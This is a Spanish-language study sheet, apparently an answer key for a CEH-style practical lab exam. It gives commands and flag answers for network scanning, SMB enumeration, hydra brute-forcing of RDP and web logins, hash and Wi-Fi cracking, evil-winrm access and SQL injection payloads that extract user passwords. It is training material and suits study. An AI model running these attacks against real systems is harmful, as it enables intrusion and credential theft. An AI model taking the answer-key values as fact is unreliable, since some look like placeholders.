@@ -1,0 +1,615 @@
+*****************************01-***************
+1.Realice una exploración exhaustiva de la red de destino para identificar el nombre de equipo DNS del controlador de dominio. 
+(Formato: AaaaaAaaa*AAAAAA*aaa)
+
+Reconocimiento inicial: Identificar hosts activos
+o	Realiza un barrido de red para detectar dispositivos en las subredes objetivo:
+	Subredes objetivo: 10.10.55.0/24, 192.168.44.0/24, 192.168.200.0/24.
+
+Crear un directorio de trabajo donde se guarda el resultado del scan (traducir la pregunta, hacer un plan)
+
+*sC script basico de reconicimiento
+*sV version de los servicio de los puertos
+-p- todo los puertos (PEPA)
+-oN  para exportar el reporte (nombre)
+
+nmap -sC -sV -p- 10.10.55.0/24 -oN nmap
+nmap -sC -sV -p- 192.168.44.0/24 -oN nmap
+nmap -sC -sV -p- 192.168.200.0/24-oN nmap
+
+Escaneo detallado de host
+nmap -T5 -sS -sV -O x.x.x.x
+
+# Escaneo de puertos y servicios
+nmap -p- -A -T4 <IP activa>
+
+# Escaneo de DNS (brute force)
+nmap --script dns-brute -p53 <IP del servidor DNS>
+
+
+Enumeración del controlador de dominio
+o	Identifica si algún host tiene los puertos relacionados con controladores de dominio abiertos:
+	Puertos comunes de controladores de dominio:
+	53: DNS
+	88: Kerberos
+	389/636: LDAP/LDAPS
+	445: SMB
+
+	Esto intenta una transferencia de zona (si está configurada incorrectamente).
+dig @<IP DNS> -t AXFR
+
+# Enumerar servicios SMB (opc1)
+enum4linux -a <IP>
+
+Listar solo usuarios
+enum4linux -U <IP_objetivo>
+Listar comparticiones SMB
+enum4linux -S <IP_objetivo>
+Obtener políticas de contraseñas
+enum4linux -P <IP_objetivo>
+
+# Enumerar servicios SMB (opc2)
+
+smbclient -L lista los recursos compartidos en un servidor SMB}
+smbclient -L 10.10.190.158 -N
+smbclient -L //192.168.44.10 -N
+smbclient //10.10.190.158/anonymous
+smbclient -L //<IP_objetivo> -U <usuario>
+smbclient -U milesdyson //10.10.190.158/milesdyson
+
+Descargar archivos y directorios desde comparticiones SMB
+
+smbget -R smb://10.10.65.186/anonymous
+
+AdminTeam.ECCCEH.com (respuesta)
+*****************************02***************
+02.Durante el curso de la investigación de un ataque, se identificó que se había explotado 
+un entorno de desarrollo web de Windows para obtener acceso no autorizado al sistema. 
+Realice un escaneado en profundidad de la red y una enumeración exhaustiva de los servicios 
+para determinar la versión del servicio IMAP Mercury que se ejecuta en el servidor. (Formato: N*NN)
+
+Crear un directorio de trabajo donde se guarda el resultado del scan (traducir la pregunta, hacer un plan)
+
+Primero, identifica los puertos abiertos y específicos del servicio IMAP (puerto 143 por defecto)
+
+*sC script basico de reconicimiento
+*sV version de los servicio de los puertos
+-p- todo los puertos (PEPA)
+-oN  para exportar el reporte (nombre)
+
+nmap -sC -sV -p- 10.10.55.0/24 -oN nmap
+nmap -sC -sV -p- 192.168.44.0/24 -oN nmap
+nmap -sC -sV -p- 192.168.200.0/24-oN nmap
+
+Escaneo detallado de host -p 143
+nmap -p 143 -sV -T4 <IP_objetivo>
+Escaneo exhaustivo
+nmap -p- -sV -sC -T4 <IP_objetivo> (opc full port)
+Validar  puerto IMAP (143) está abierto
+telnet <IP_objetivo> 143
+* OK [Mercury/32 v4.62] IMAP4rev1 Server ready
+ (4.62)
+********************03**********************
+
+Identifica un sistema con RDP habilitado en la subred 10.10.55.0/24 y descifra las credenciales 
+RDP del usuario Jones. Recupera el archivo forger.cfe que contiene una imagen cifrada. 
+Calcula el hash SHA1 del archivo de imagen descifrado y proporciona los seis últimos dígitos como respuesta. 
+Nota: Utiliza la contraseña de Jones para extraer el archivo de imagen. (Formato: NNaaNN)
+
+Identificar el sistema con RDP habilitado en la subred (nmap)
+nmap -p 3389 --open 10.10.55.0/24
+Enumerar las credenciales de RDP para el usuario Jones (cracking de contraseñas)
+hydra -l Jones -P /ruta/a/diccionario.txt rdp://<IP_objetivo>
+
+hydra -l milesdyson -P log1.txt 10.10.65.186 http-post-form "/squirrelmail/src/redirect.php:login_username=
+milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
+
+Recupera el archivo forger.cfe que contiene una imagen cifrada. Calcula el hash SHA1 del archivo de imagen descifrado 
+y proporciona los seis últimos dígitos
+
+Recuperar el archivo cifrado (forger.cfe)
+unzip -P <contraseña_de_Jones> forger.cfe.zip
+Calcular el hash SHA1 del archivo de imagen descifrado
+sha1sum forger.cfe
+aabbccdd11223344eeff11223344aabbcc60aa64 forger.cfe
+
+(60aa64)
+
+************************04*********************
+Se ha detectado un ataque interno que afecta al dispositivo móvil de un empleado dentro de la subred 10.10.55.0/24. 
+Se sospecha que el empleado almacena datos confidenciales dentro de un archivo de imagen en el dispositivo. 
+Se sospecha que el empleado almacena datos confidenciales en un archivo de imagen del dispositivo. 
+Su tarea consiste en acceder discretamente al dispositivo, recuperar los datos ocultos del archivo de imagen, 
+analizarlos y extraer la información sensible oculta para obtener el código secreto. (Formato: A**aaaAN*a)
+
+Crear un directorio de trabajo donde se guarda el resultado del scan (traducir la pregunta, hacer un plan)
+
+*sC script basico de reconicimiento
+*sV version de los servicio de los puertos
+-p- todo los puertos (PEPA) Escanea todos los puertos (1-65535).
+-oN  para exportar el reporte (nombre)
+
+nmap -sC -sV -p- 10.10.55.0/24 -oN nmap (PEPA tener el resultado file)
+nmap -p- --open 10.10.55.0/24 (opc)
+
+Identificar servicios y posibles vectores de acceso en el dispositivo móvil
+Los servicios como adb (Android Debug Bridge) podrían estar habilitados. Si encuentras un puerto relacionado con ADB (puerto 5555)
+
+nmap -p 5555 --open 10.10.55.0/24
+-p 5555: Escanea el puerto ADB (comúnmente 5555).
+--open: Muestra dispositivos con ADB habilitado.
+
+Acceder al dispositivo móvil con ADB (si está disponible)
+
+adb connect <IP_objetivo>:5555
+adb shell
+
+Buscar el archivo de imagen sospechoso
+find / -type f -iname "*.jpg" -o -iname "*.png"
+
+Verificar si los datos están ocultos en la imagen (steganografía)
+steghide extract -sf imagen.jpg
+
+zsteg imagen.png (opc2)
+
+Analizar los datos extraídos
+cat archivo_extraído.txt
+
+*************************05********************
+
+Realice una evaluación de vulnerabilidades en el host con la dirección IP 192.168.44.32. Determine el número total de vulnerabilidades clasificadas como de gravedad baja y envíe el recuento como respuesta. (Formato: N)}
+
+Nessus (Escaneo de vulnerabilidades)
+Iniciar el escaneo: Utiliza la interfaz gráfica de Nessus para configurar y lanzar el escaneo de vulnerabilidades en la IP 192.168.44.32.
+
+openvas-start (opc2)
+
+(1)
+
+*********************06***********************
+Nmap (Escaneo de la red y descubrimiento de servicios)
+
+
+rear un directorio de trabajo donde se guarda el resultado del scan (traducir la pregunta, hacer un plan)
+
+*sC script basico de reconicimiento
+*sV version de los servicio de los puertos
+-p- todo los puertos (PEPA) Escanea todos los puertos (1-65535).
+-oN  para exportar el reporte (nombre)
+
+nmap -sC -sV -p- 10.10.55.0/24 -oN nmap (PEPA tener el resultado file)
+nmap -p 22 --open 10.10.55.0/24
+
+SSH (Secure Shell) (Acceso remoto a sistemas Linux)
+ssh usuario@IP_objetivo
+
+SCP (Secure Copy Protocol) (Si necesitas transferir el archivo)
+scp usuario@IP_objetivo:/ruta/a/StealthNet.txt /ruta/local/destino
+
+cat /ruta/a/StealthNet.txt
+
+Encontrar contraseña de un hash SSH con diccionario
+sudo python ssh2john.py idrsa.id_rsa > key-hash.txt
+john  --wordlist=/usr/share/wordslists/rockyou.txt key-hash.txt
+
+************************07********************
+
+Un antiguo empleado de la organización ha robado una credencial de cuenta crítica y la ha almacenado en un archivo llamado pixelpioneer.txt 
+antes de abandonar la empresa. La credencial es una cadena alfanumérica de nueve caracteres. Accede al archivo pixelpioneer.txt,
+ ubicado en la carpeta Descargas de la "Estación de trabajo EH - 2", donde se identificó como un archivo adjunto de correo electrónico. 
+ Nota: Ha aprendido que la "contraseña" es la clave para extraer datos del archivo pixelpioneer.txt. (Formato: ANaa*aANaNa)
+
+Conectarse a la Estación de Trabajo EH - 2 (Windows 11)}
+Acceder a la máquina mediante RDP (Remote Desktop Protocol) o por acceso físico si es posible.
+
+Comando SSH o RDP (si es accesible a través de RDP):
+mstsc /v:<IP_de_EH_2>
+ssh Admin@192.168.44.32
+
+Acceder a la carpeta "Descargas" en la estación de trabajo
+cd C:\Users\Administrator\Downloads
+
+Descomprimir o desbloquear el archivo pixelpioneer.txt (si está cifrado)
+
+unzip -P contraseña pixelpioneer.txt.zip
+type pixelpioneer.txt
+
+**************************08****************************
+Enumerar el servicio SMB (445) y acceder con credenciales débiles.
+
+Aproveche las credenciales débiles para el servicio SMB en una máquina Windows dentro de la subred 10.10.55.0/24 para obtener acceso al archivo,
+ QuantumCoder.txt, ubicado en el directorio raíz SMB. Extraiga el contenido del archivo y envíelo como respuesta. (Formato: Aa*aNaaNNa)
+
+ Escaneo de la subred para identificar el servicio SMB
+ nmap -p 445 --open 10.10.55.0/24
+Comando para enumerar recursos SMB:
+smbclient -L //<IP_del_host> -U <usuario>
+Conexión al recurso compartido SMB y acceso al archivo
+smbclient //<IP_del_host>/<recurso_compartido> -U <usuario>
+Comando para extraer el archivo QuantumCoder.txt:
+get QuantumCoder.txt
+cat QuantumCoder.txt
+
+*****************************09****************************
+
+Se le ha encomendado la tarea de realizar un análisis estático de malware en el archivo ejecutable malicioso Wildfire.exe, ubicado en la carpeta Descargas 
+de la estación de trabajo 2 de EH. Identifique el número de versión de imagen del ejecutable y envíelo como respuesta. (Formato: N*N)
+
+
+Acceso a la Estación de trabajo 2 de EH
+Para comenzar, necesitamos acceder a la Estación de trabajo 2 de EH, que está probablemente en un sistema Windows. 
+Las credenciales de acceso proporcionadas anteriormente son:
+
+Usuario: Admin
+Contraseña: Pa$$w0rd
+
+Comando para acceder a la estación (RDP o SSH si es necesario)
+
+mstsc /v:<IP_de_EH_2>
+ssh Admin@<IP_de_EH_2>
+
+Ubicación del archivo Wildfire.exe
+cd C:\Users\Administrator\Downloads
+
+Análisis estático del archivo Wildfire.exe
+Herramientas que se pueden usar:
+sigcheck -v Wildfire.exe
+
+PeStudio: Si estás trabajando con una máquina Windows,
+exiftool: En caso de que prefieras usar una herramienta de línea de comandos en sistemas Linux 
+exiftool también puede extraer información de metadatos de archivos ejecutables
+
+exiftool Wildfire.exe
+
+(1.0)
+
+***********************************010**********************************
+RAT preconfigurado para explorar la máquina remota y contar los archivos.
+
+Un ex empleado subversivo, Martin, ha ocultado archivos confidenciales en una carpeta llamada "Honeywell"
+en una máquina Windows dentro de la subred 10.10.55.0/24. Aunque el acceso físico a la máquina objetivo no es factible, 
+se sabe que se ha instalado una Herramienta de Acceso Remoto (RAT) para la administración remota. 
+Su tarea consiste en identificar el número de archivos contenidos en la carpeta "Honeywell" 
+y proporcionar como respuesta el recuento total de archivos a los que ha accedido el empleado. (Formato: N)
+
+
+Identificar la máquina objetivo en la subred
+Esto escanea puertos comunes asociados con RDP (3389), SMB (445, 139) y WinRM (5985) en la subred.
+
+nmap -p 3389,445,139,5985 10.10.55.0/24 -oN target_scan.txt
+
+Conexión a la máquina utilizando la RAT
+Opción 1: Usando Metasploit
+msfconsole
+Configurar la sesión RAT (si la máquina está comprometida con un payload RAT
+sessions -i <session_id>
+Navegar por los directorios para encontrar la carpeta Honeywell:
+cd C:\Honeywell
+dir
+
+Opción 2: Usando SMB para listar archivos remotamente
+Si la carpeta Honeywell está compartida en SMB, podemos enumerarla utilizando smbclient.
+
+smbclient //10.10.55.X/Honeywell -U <username>
+
+Opción 3: Usando WinRM (Windows Remote Management)
+evil-winrm -i 10.10.55.X -u <username> -p <password>
+cd C:\Honeywell
+dir
+
+Contar los archivos en la carpeta (2)
+
+***************************************11*********************************
+Analizar el ejecutable con herramientas de depuración malware
+
+Una persona que responde a un incidente ha adquirido un archivo ejecutable sospechoso llamado "Ghostware" 
+durante una misión. Como analista de malware, su tarea consiste en identificar el punto de entrada (dirección) del ejecutable. 
+El archivo se encuentra en el directorio C:\Users\Admin\Documents del equipo denominado "EH Workstation - 2. (Formato: NNNNaNNNN)
+
+El objetivo es realizar un análisis estático del ejecutable llamado "Ghostware" para identificar el punto de entrada (Entry Point Address).
+
+Acceso a la máquina EH Workstation - 2
+
+Acceso directo (si tienes acceso físico):
+
+Navega al directorio usando el Explorador de Windows.
+Acceso remoto (si solo puedes interactuar de forma remota):
+Utiliza herramientas como smbclient o WinRM para conectarte a la máquina y acceder al archivo.
+
+Transferencia del archivo a un entorno de análisis
+scp C:\Users\Admin\Documents\Ghostware user@<analyst_machine_ip>:/analysis_dir
+
+Análisis estático para identificar el punto de entrada
+Opción 1: PEview (para análisis manual de archivos PE)
+Descarga e instala PEview en tu máquina de análisis.
+Abre el archivo Ghostware.exe en PEview.
+Navega hasta la sección Optional Header en la estructura del archivo PE.
+Localiza el valor Address of Entry Point (Entry Point).
+El valor se mostrará en formato hexadecimal, por ejemplo: 0x00001110.
+
+Opción 2: objdump (en sistemas Linux/Unix)
+Si el archivo se transfirió a un sistema Linux para análisis:
+
+Usa objdump para obtener detalles del ejecutable:
+
+objdump -x Ghostware.exe | grep "Entry point"
+
+Convertir la dirección a formato requerido
+El valor del Entry Point normalmente está en formato hexadecimal.
+
+Convierte este valor en el formato decimal NNNNaNNNN, si es necesario, utilizando una calculadora hexadecimal o la línea de comandos:
+Conversión con Python:
+python
+
+entry_point_hex = "0x00001110"
+entry_point_decimal = int(entry_point_hex, 16)
+print(entry_point_decimal)
+
+
+(0041e768)
+********************012*************************************
+Wireshark y filtrar por direcciones IP y paquetes maliciosos
+
+Se le asigna investigar un ataque DDoS a gran escala dirigido a la dirección IP 172.22.10.10. El objetivo es analizar el tráfico de red para identificar 
+los paquetes maliciosos implicados y determinar la dirección IP de la máquina atacante que ejecuta Windows como sistema operativo. 
+El archivo de captura de red, Mystic-capture.pcapng, se encuentra en el directorio Documentos de la máquina "EH Workstation - 2" 
+(Windows 11). (Formato: NN*NN*NN*NN)
+
+ Acceso a la captura de red
+ C:\Users\Admin\Documents\
+scp C:\Users\Admin\Documents\Mystic-capture.pcapng user@<analyst_machine_ip>:/analysis_dir
+
+Abrir el archivo en Wireshark
+Aplicar filtros para investigar el ataque DDoS
+Usa el filtro siguiente para concentrarte en el tráfico hacia la dirección IP objetivo:
+
+ip.dst == 172.22.10.10
+
+ Identificar posibles patrones de ataque DDoS:
+ Observa si hay un gran volumen de paquetes provenientes de una sola IP o varias.
+Filtra paquetes por protocolo relevante (HTTP, TCP, ICMP, etc.) según la naturaleza del ataque:
+Para ICMP (flood de ping):
+
+icmp && ip.dst == 172.22.10.10
+
+Para TCP (flood SYN):
+tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 172.22.10.10
+
+ Identificar paquetes de una máquina Windows:
+ http.user_agent contains "Windows"
+
+Alternativamente, inspecciona el tráfico SMB o NetBIOS:
+smb || nbns
+
+Identificar la IP atacante
+Source IP (ip.src)
+(10.10.55.11)
+
+**************************013************************************************
+Explotar vulnerabilidad SQL Injection
+
+Se te asigna extraer la contraseña de un usuario, Matthew, de una aplicación web, cinema.cehorg.com, que es vulnerable 
+a un ataque de inyección SQL. Nota: Ya se ha registrado en el sitio web con las credenciales Sarah/abc123. (Formato: NNNNNNNN)
+
+Abre un navegador web en la estación de trabajo y navega al sitio:
+http://cinema.cehorg.com.
+
+Inicia sesión con las credenciales proporcionadas:
+
+Usuario: Sarah
+Contraseña: abc123
+
+ Identificar la vulnerabilidad de inyección SQL
+ ' OR '1'='1 --
+SQL Injection 2: Input Box String
+
+1' or '1'='1'-- -
+1 or 1 = 1 -- -
+SQL Injection 3: URL Injection
+
+Estructura base http://x.x.x.x:5000/sesqli3/login?profileID=a&password=a
+modficar con ' or 1=1 -- -&password=a
+
+http://10.10.55.180:5000/sesqli3/login?profileID=' or 1=1 -- -&password=a
+
+Extraer la contraseña del usuario "Matthew"
+Una vez que confirmes que el sitio es vulnerable, utiliza un payload de inyección para consultar la base de datos y obtener la contraseña.
+
+Prueba con un payload para obtener información de la base de datos:
+' UNION SELECT 1, username, password FROM users --
+
+Si la tabla y los campos no son correctos, intenta enumerar nombres de tablas y columnas:
+' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --
+
+Enumerar columnas de la tabla "users":
+' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --
+
+Extraer la contraseña de "Matthew":
+
+' UNION SELECT NULL, username, password FROM users WHERE username='Matthew' --
+
+Respuesta:
+
+Formatear la contraseña extraída como NNNNNNNN.
+
+*******************************014***********************************
+FLAG WEB 
+Explore la aplicación web en www.cehorg.com e introduzca el valor de la bandera en la página con page_id=103. (Formato: N*aA*a)
+
+Acceso inicial:
+
+Abre un navegador web y visita: http://www.cehorg.com.
+Identificar la página específica:
+
+Navega a la URL:
+http://www.cehorg.com?page_id=103.
+Inspección de la página:
+
+Revisa el contenido visible de la página.
+Si la bandera no es visible, inspecciona el código fuente de la página (clic derecho → "Ver código fuente").
+Buscar la bandera:
+
+Busca términos como flag, hidden, o el formato especificado (NaAa).
+También puedes usar combinaciones de teclas para buscar (Ctrl + F) dentro del código fuente.
+Extraer la bandera:
+
+Identifica y copia el valor que coincida con el formato NaAa.
+(1'mM@d)
+
+*******************************015**********************************
+Ataque de inyección SQL
+
+Se le ha asignado explotar una aplicación web vulnerable, cybersec.cehorg.com, alojada en 192.168.44.40, 
+que es vulnerable a un ataque de inyección SQL. Determine el valor de la columna cybersec de una de las tablas de la base de datos como respuesta. 
+(Formato: A**a*NNA)
+
+Acceso inicial
+Abre un navegador web y accede a la aplicación web:
+http://cybersec.cehorg.com o http://192.168.44.40
+
+Identificación de la vulnerabilidad de inyección SQL
+
+' OR '1'='1 --
+
+Enumeración de tablas y columnas
+' UNION SELECT NULL, table_name FROM information_schema.tables --
+Identificar columnas de una tabla específica:
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='cybersec_table' --
+
+Extraer el valor de la columna cybersec
+' UNION SELECT NULL, cybersec FROM cybersec_table --
+
+
+*****************************017*************************************
+Descifra los cifrados base64 
+
+Se ha cargado un lote de archivos a través de DVWA (http://192.168.44.32:8080/DVWA). Estos archivos están almacenados en el directorio
+ "C:\wamp64\www\DVWA\SecureWeb\prod\". Descifra los cifrados base64 para encontrar el mensaje original entre ellos y determina el 
+ mensaje descifrado como respuesta. Nota: Inicie sesión en DVWA con admin/contraseña. (Formato: AaaN*aNaN)
+
+ Acceso inicial
+Abre un navegador y accede a:
+http://192.168.44.32:8080/DVWA.
+
+Inicia sesión en DVWA con las credenciales:
+
+Usuario: admin
+Contraseña: contraseña
+
+Localizar los archivos cargados
+Identifica el directorio donde están almacenados los archivos:
+C:\wamp64\www\DVWA\SecureWeb\prod\.
+
+Decodificar los archivos Base64
+
+Descarga o accede al contenido de los archivos. Si los archivos son accesibles en DVWA o el servidor, utiliza un navegador 
+o herramienta de línea de comandos para descargarlos.
+
+Decodifica cada archivo que contiene texto Base64.
+
+Usa un editor de texto o una herramienta en línea para identificar contenido Base64.
+Decodifica el contenido usando un comando como:
+
+echo "<base64_string>" | base64 -d
+
+Buscar el mensaje original
+Lee los mensajes descifrados de los archivos.
+Identifica el texto que coincide con el formato solicitado (AaaN*aNaN).
+
+******************************018***********************************
+Tráfico IoT con Wireshark 
+
+Analiza la captura de tráfico de una red IoT localizada en la carpeta Documentos de la máquina "EH Workstation - 1" (ParrotSecurity), 
+identifica el paquete con IoT Publish Message, e introduce el tema como respuesta. (Formato: Aaaa*Aaaa)
+
+Preparación
+Accede a la máquina EH Workstation - 1 (Parrot Security).
+Navega a la carpeta Documentos para localizar el archivo de captura de tráfico, probablemente llamado algo como iot_traffic.pcapng.
+
+Abrir el archivo en Wireshark
+
+Identificar mensajes "IoT Publish"
+Usa el filtro para encontrar paquetes relacionados con MQTT Publish (el protocolo típico de IoT).
+Filtro recomendado:
+
+mqtt.msgtype == 3
+
+El msgtype == 3 filtra los paquetes de tipo "Publish".
+
+************************************019***************************
+Desencriptar el archivo VeraCrypt 
+
+Un empleado descontento encriptó secretos comerciales de una empresa utilizando VeraCrypt. El archivo de volumen "Mass1nfo" está almacenado 
+en la unidad C: de "EH Workstation - 2". El hash de la contraseña necesaria para acceder al archivo de volumen está en "Hashed1nfo.txt" 
+en la carpeta Documentos de "EH Workstation - 1" (ParrotSecurity). Como hacker ético, desencripta el hash, accede al volumen VeraCrypt 
+y encuentra el código secreto en CS_eng.txt. (Formato: Naaa*aaN*)
+
+Preparación
+Ubicación de los archivos:
+
+Archivo de volumen VeraCrypt: C:\Mass1nfo en EH Workstation - 2 (Windows 11).
+Archivo hash de contraseña: Hashed1nfo.txt en la carpeta Documentos de EH Workstation - 1 (Parrot Security).
+Acceso a las máquinas:
+
+Conéctate a EH Workstation - 1 (Parrot Security) para trabajar con el archivo hash.
+Utiliza EH Workstation - 2 (Windows 11) para montar y explorar el volumen VeraCrypt
+
+Desencriptar el hash
+Abre el archivo Hashed1nfo.txt en EH Workstation - 1:
+
+cat ~/Documentos/Hashed1nfo.txt
+
+Realiza un ataque de fuerza bruta para obtener la contraseña del volumen: Utiliza la herramienta hashcat:
+
+hashcat -m 0 /ruta/a/Hashed1nfo.txt /ruta/a/passwords.txt --force
+
+-m 0: Especifica el modo para hashes MD5.
+/ruta/a/passwords.txt: Es un diccionario con posibles contraseñas
+
+Montar el volumen VeraCrypt
+
+Una vez montado, accede al volumen desde Mi PC.
+Navega dentro del volumen y localiza el archivo CS_eng.txt.
+
+Extraer el código secreto
+
+Abre CS_eng.txt con un editor de texto.
+Copia el contenido que cumple el formato solicitado (NaaaaaN).
+
+1nfo$ec3(
+
+*****************************************020***************************
+Aircrack-ng para crackear la clave Wi-Fi
+
+Su organización ha identificado actividad inalámbrica sospechosa y sospecha de la presencia de un punto de acceso (AP) 
+fraudulento en la zona. Un archivo de captura de tráfico inalámbrico, "Credmapwifi.cap", generado utilizando la herramienta airdump-ng, 
+se encuentra en la carpeta Documentos de la máquina "EH Workstation-1" (ParrotSecurity). Se te ha encargado analizar el archivo, descifrar 
+la contraseña Wi-Fi e identificar los últimos cuatro caracteres de la contraseña como respuesta. (Formato: aaaN)
+
+Preparación
+Accede a la máquina EH Workstation-1 (Parrot Security).
+Navega a la carpeta Documentos para localizar el archivo de captura: Credmapwifi.cap.
+
+ Analizar el archivo de captura
+Inspecciona el archivo con aircrack-ng para buscar redes disponibles:
+
+aircrack-ng /ruta/a/Credmapwifi.cap
+
+Esto mostrará las redes detectadas y sus detalles, incluyendo el BSSID, ESSID, y si hay handshakes capturados.
+
+Identifica si hay un handshake disponible:
+
+Busca la red sospechosa (AP fraudulento) y verifica si el handshake está completo.
+
+Descifrar la contraseña Wi-Fi
+Utiliza un diccionario de contraseñas para descifrar el handshake:
+
+aircrack-ng -w /ruta/a/diccionario.txt -b [BSSID] /ruta/a/Credmapwifi.cap
+
+-w /ruta/a/diccionario.txt: Ruta al archivo de diccionario.
+-b [BSSID]: El BSSID del punto de acceso sospechoso.
+
+Extraer los últimos cuatro caracteres
+
+Una vez descifrada la contraseña, extrae los últimos cuatro caracteres.
+Respuesta: El formato será aaaN (ord1)
